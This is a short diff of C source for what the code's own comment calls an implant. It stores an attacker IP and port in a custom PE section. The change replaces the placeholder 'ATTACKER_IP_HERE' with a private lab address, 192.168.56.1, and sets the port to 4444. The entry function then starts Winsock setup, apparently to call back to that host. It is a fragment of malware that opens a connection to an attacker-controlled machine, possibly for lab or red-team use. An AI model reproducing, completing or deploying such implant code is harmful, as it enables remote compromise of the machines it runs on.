@@ -14,8 +14,8 @@
 // Much cleaner than command line args for a real implant
 #pragma section(".jocky", read, write)
 __declspec(allocate(".jocky"))
-volatile char g_attackerIp[64]  = "ATTACKER_IP_HERE";
-volatile USHORT g_attackerPort  = DEFAULT_PORT;
+volatile char g_attackerIp[64]  = "192.168.56.1";
+volatile USHORT g_attackerPort  = 4444;
 
 void payload_entry() {
     WSADATA wsa;
